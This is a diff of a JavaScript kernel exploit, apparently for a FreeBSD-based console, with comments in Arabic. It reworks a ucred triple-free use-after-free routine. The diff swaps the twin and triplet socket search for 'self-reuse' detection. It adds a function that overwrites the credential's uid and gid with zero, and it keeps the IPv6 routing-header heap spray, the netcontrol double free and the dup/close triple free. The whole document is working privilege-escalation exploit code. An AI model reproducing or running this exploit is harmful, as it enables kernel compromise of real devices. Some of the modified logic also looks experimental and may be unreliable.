@@ -831,144 +831,6 @@ function dumpBuf(ptr, size, label) {
   log(out);
 }
 
-// === core ===
-function find_twins_core() {
-  var count = 0;
-  var val, i, j;
-  var zeroMemoryCount = 0;
-  twins[0] = -1;
-  twins[1] = -1;
-
-  var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
-
-  while (count < MAX_ROUNDS_TWIN) {
-    if (typeof debugging !== 'undefined' &&
-        debugging.info && debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-      zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
-        log("[TWINS] MEMORY LIMIT REACHED (soft abort)");
-        return false;
-      }
-    } else {
-      zeroMemoryCount = 0;
-    }
-
-    // WRITE PHASE
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      var tag = RTHDR_TAG | i;
-      write32(spray_add, tag);
-      read32(spray_add);
-
-      var spray_ptr = spray_rthdr_rop.add(i * UCRED_SIZE);
-      set_rthdr(ipv6_socks[i], spray_ptr, spray_rthdr_len);
-    }
-
-    // READ PHASE
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
-      get_rthdr(ipv6_socks[i], leak_rthdr, 0x20);
-
-      val = read32(leak_add);
-      j = val & 0xFFFF;
-
-      var condition =
-        (val & 0xFFFF0000) === RTHDR_TAG &&
-        j === i;
-
-      if (condition) {
-        send_notification("\n[SELF-REUSE] i=" + i + " j=" + j + "\n");
-        twins[0] = i;
-        twins[1] = i; // self-reuse: نفس السوكت
-        return true;
-      }
-      
-    }
-
-    count++;
-  }
-
-  return false;
-}
-
-// === wrapper ===
-var real_find_twins = find_twins_core;
-
-function find_twins() {
-  var result = real_find_twins();
-  if (!result) {
-  }
-  return result;
-}
-
-// === core ===
-function find_triplet_core(master, other, iterations) {
-  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
-
-  var count = 0;
-  var val, i, j;
-  var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
-
-  while (count < iterations) {
-    // WRITE PHASE
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
-
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-    }
-
-    // READ PHASE من master
-    write32(leak_add, 0);
-    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
-
-    val = read32(leak_add);
-    j = val & 0xFFFF;
-
-    // منع false positives
-    if (j === master || j === other) {
-      count++;
-      continue;
-    }
-
-    if ((val & 0xFFFF0000) === RTHDR_TAG &&
-        j >= 0 && j < ipv6_socks.length) {
-      return j;
-    }
-
-    count++;
-  }
-
-  return -1;
-}
-
-// === wrapper ===
-var real_find_triplet = find_triplet_core;
-
-function find_triplet(master, other, iterations) {
-  log("[TRIPLET] START master=" + master + " other=" + other +
-      " iters=" + (typeof iterations === 'undefined' ? MAX_ROUNDS_TRIPLET : iterations));
-
-  var res = real_find_triplet(master, other, iterations);
-
-  if (res === -1) {
-    log("[TRIPLET] RESULT = NOT FOUND");
-  } else {
-    log("[TRIPLET] RESULT = FOUND idx=" + res);
-  }
-
-  return res;
-}
-
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
@@ -1390,31 +1252,82 @@ function remove_uaf_file() {
     }
   }
 }
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
+function find_self_reuse_core() {
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
+  twins[0] = -1;
+  twins[1] = -1;
+
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    if (ipv6_socks[i].eq(BigInt_Error)) continue;
+
+    // اكتب tag مميز في rthdr
+    write32(spray_add, RTHDR_TAG | i);
+    set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+
+    // اقرأه تاني من نفس السوكت
+    write32(leak_add, 0);
+    get_rthdr(ipv6_socks[i], leak_rthdr, 0x20);
+
+    var val = read32(leak_add);
+    var j   = val & 0xFFFF;
+
+    if ((val & 0xFFFF0000) === RTHDR_TAG && j === i) {
+      send_notification("[SELF-REUSE] i=" + i + " j=" + j);
+      twins[0] = i;
+      twins[1] = i; // نفس السوكت
+      return true;
+    }
+  }
+
+  return false;
+}
+
+function find_twins() {
+  send_notification("[TWINS/SELF] START");
+  var ok = find_self_reuse_core();
+  send_notification("[TWINS/SELF] RESULT = " + ok +
+                    " twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
+  return ok;
+}
+function overwrite_ucred(sock) {
+  send_notification("[SELF] overwrite_ucred on sock=" + sock);
+
+  // uid / gid = 0
+  write32(spray_rthdr.add(0x04), 0); // uid
+  write32(spray_rthdr.add(0x08), 0); // gid
+
+  // لو محتاج euid/egid أو غيره، زوّدهم هنا بنفس الفكرة
+
+  set_rthdr(sock, spray_rthdr, spray_rthdr_len);
+}
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
+
 function trigger_ucred_triplefree() {
-  //log("[TRIGGER] enter trigger_ucred_triplefree");
-  var end = false;
-  var uaf_socket = -1
-  // msgIov كما في الأصلي
-  log("[TRIGGER] init msgIov");
+  send_notification("[SELF] enter trigger_ucred_triplefree");
+
+  var end        = false;
+  var uaf_socket = -1;
+  var main_count = 0;
+
+  // msgIov init (زي الأصلي)
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
-  var main_count = 0;
+
+  // buffer بسيط لدورة iov
+  var tmp = malloc(0x40);
+
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
-    //log("[TRIGGER] loop start main_count=" + main_count);
+    send_notification("[SELF] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 1: dummy_socket = " + dummy_socket);
-
-    // نحتفظ بالـ FD الأصلي قبل أي لعب
-    var dummy_fd = dummy_socket;
+    var dummy_fd     = dummy_socket;
 
     var sock_buf = malloc(8);
-    write32(sock_buf, dummy_socket);
-    send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
+    write32(sock_buf, dummy_fd);
     netcontrol(-1, 0x20000003, sock_buf, 8);
     close(dummy_socket);
 
@@ -1423,136 +1336,82 @@ function trigger_ucred_triplefree() {
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 3: uaf_socket = " + uaf_socket + " (expected FD reuse ~ " + dummy_fd + ")");
+    send_notification("[SELF] step 3: uaf_socket = " + uaf_socket +
+                      " (expected FD reuse ~ " + dummy_fd + ")");
 
     // 4) free previous ucred
     setuid(1);
 
-    // هنا التغيير المهم: نستخدم dummy_fd مش uaf_socket
+    // 5) free via netcontrol (double-free #1)
     var ctrl_buf = malloc(8);
     write32(ctrl_buf, dummy_fd);
-    send_notification("step 5: ctrl_buf = dummy_fd = " + dummy_fd);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
-    // 6) محاولة إصلاح refcount بشكل خفيف (نخليها زي ما هي مؤقتًا)
-    var tmp_byte = malloc(8)
-    send_notification("iov0=" + iov_sock_0 + ", iov1=" + iov_sock_1);
-    for (var i = 0; i < 2; i++) {
-        trigger_iov_recvmsg();
-        var w = write(new BigInt(iov_sock_1), tmp_byte, 1);
-        wait_iov_recvmsg();
-        var r = read(new BigInt(iov_sock_0), tmp_byte, 1);
-
-        send_notification("step 6: loop " + i + " (w=" + w + ", r=" + r + ")");
-    }
-
-    // 7) double free أول مرة – نحاول نخليها أوضح شوية في اللوج
+    // 6) double-free #2 via dup/close
     var dup_fd = dup(uaf_socket);
-    send_notification("step 7: dup_fd = " + dup_fd + " (from uaf_socket = " + uaf_socket + ")");
-
+    send_notification("[SELF] step 6: dup_fd = " + dup_fd);
     if (dup_fd > -1) {
       close(dup_fd);
-    } else {
-      send_notification("step 7: dup failed");
     }
 
-    // 8) إيجاد التوأم
-    send_notification("[TRIGGER] step 8: find_twins()");
+    // 7) self-reuse detection (بدل twin)
+    send_notification("[SELF] step 7: find_twins (self-reuse mode)");
     end = find_twins();
-    send_notification("[TRIGGER] step 8: find_twins() result end=" + end);
+    send_notification("[SELF] step 7: find_twins result = " + end);
 
     if (!end) {
-      send_notification("[TRIGGER] step 8: no twins, cleanup & retry");
+      send_notification("[SELF] no self-reuse, cleanup & retry");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
-    send_notification("[TRIGGER] step 8: twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
-    // 9) free واحدة من التوأم
-    free_rthdr(ipv6_socks[twins[1]]);
+    send_notification("[SELF] self-reuse on ipv6_socks[" + twins[0] + "]");
 
-    // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
-    //log("[TRIGGER] step 10: wait refcount==1, max_wait=" + TRIPLEFREE_REFCOUNT_MAX_WAIT);
+    // 8) refcount tuning (اختياري، بس منطقي)
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      // log("[TRIGGER]   refcount loop count=" + count);
-
-      // شغّل recvmsg
       trigger_iov_recvmsg();
 
-      // كمّل دورة iov بالكامل
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
-      // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
       var refc = read32(leak_rthdr);
-      //log("[TRIGGER]   refcount read=" + refc);
+
       if (refc === 1) break;
       count++;
     }
-    //log("[TRIGGER] step 10: refcount loop end count=" + count);
 
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      //log("[TRIGGER] step 10: refcount never reached 1, reset & retry");
+      send_notification("[SELF] refcount never reached 1, retry");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
     }
-    triplets[0] = twins[0];
-    //log("[TRIGGER] step 10: refcount==1, triplets[0]=" + triplets[0]);
 
-    // 11) triple free فعليًا
-    //log("[TRIGGER] step 11: triple-free via dup(uaf_socket)");
+    // 9) triple-free فعليًا
     close(dup(new BigInt(uaf_socket)));
-    //log("[TRIGGER] step 11 done");
+    send_notification("[SELF] step 9: triple-free done");
 
-    // 12) إيجاد triplet 1
-    //log("[TRIGGER] step 12: find_triplet #1 from " + triplets[0]);
-    triplets[1] = find_triplet(triplets[0], -1);
-    //log("[TRIGGER] step 12: triplets[1]=" + triplets[1]);
+    // 10) overwrite ucred على نفس السوكت
+    overwrite_ucred(uaf_socket);
+    send_notification("[SELF] step 10: overwrite_ucred done");
 
-    if (triplets[1] === -1) {
-      //log("[TRIGGER] step 12: triplet[1] not found, cleanup & retry");
-      twins[0] = -1;
-      twins[1] = -1;
-      write(new BigInt(iov_sock_1), tmp, 1);
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
-    }
-    write(new BigInt(iov_sock_1), tmp, 1);
-    //log("[TRIGGER] step 12 done");
-
-    // 13) إيجاد triplet 2
-    //log("[TRIGGER] step 13: find_triplet #2 from " + triplets[0] + " exclude " + triplets[1]);
-    triplets[2] = find_triplet(triplets[0], triplets[1]);
-    //log("[TRIGGER] step 13: triplets[2]=" + triplets[2]);
-
-    if (triplets[2] === -1) {
-      //log("[TRIGGER] step 13: triplet[2] not found, cleanup & retry");
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
-    }
-    wait_iov_recvmsg();
-    read(new BigInt(iov_sock_0), tmp, 1);
-    log("[TRIGGER] step 13 done, triple found: [" + triplets[0] + "," + triplets[1] + "," + triplets[2] + "]");
+    end = true;
   }
-  if (main_count === TRIPLEFREE_ITERATIONS) {
-    //log("[TRIGGER] leave trigger_ucred_triplefree (fail: main_count limit)");
+
+  if (!end) {
+    send_notification("[SELF] trigger_ucred_triplefree: FAIL (iterations limit)");
     return false;
   }
 
-  //log("[TRIGGER] leave trigger_ucred_triplefree (success)");
+  send_notification("[SELF] trigger_ucred_triplefree: SUCCESS");
   return true;
 }
 function leak_kqueue() {
